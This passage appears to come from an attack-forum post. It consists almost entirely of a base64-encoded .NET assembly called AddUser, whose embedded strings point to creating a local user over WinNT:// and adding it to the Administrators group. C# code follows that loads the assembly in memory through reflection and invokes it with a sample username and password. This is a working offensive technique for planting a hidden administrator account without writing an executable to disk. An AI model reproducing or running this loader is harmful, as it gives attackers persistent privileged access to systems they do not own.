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";
byte[] buffer = Convert.FromBase64String(base64str);
Assembly assembly = Assembly.Load(buffer);
Type type = assembly.GetType("AddUser.Test");
MethodInfo method = type.GetMethod("Add");
Object obj = assembly.CreateInstance(method.Name);
string username = "tttttt";
string password = "test123..";
method.Invoke(obj, new object[] { username,password ,DE});
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-d1d393b66013898f099510da9676ccb31f951033.png)